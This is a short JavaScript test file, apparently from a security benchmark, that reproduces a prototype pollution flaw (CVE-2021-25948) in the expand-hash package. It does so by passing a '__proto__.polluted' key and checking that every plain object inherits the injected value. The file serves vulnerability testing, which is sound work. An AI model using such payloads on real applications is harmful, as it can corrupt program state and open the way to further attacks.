//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25948
test("prototype pollution in expand-hash ", () => {
  var expandHash = require("expand-hash");
  var obj = {};

  expect({}.polluted).toBe(undefined);

  expandHash({ "__proto__.polluted": process.env.SECBENCH_PAYLOAD || ("yes") });

  expect({}.polluted).toBe("yes");
});
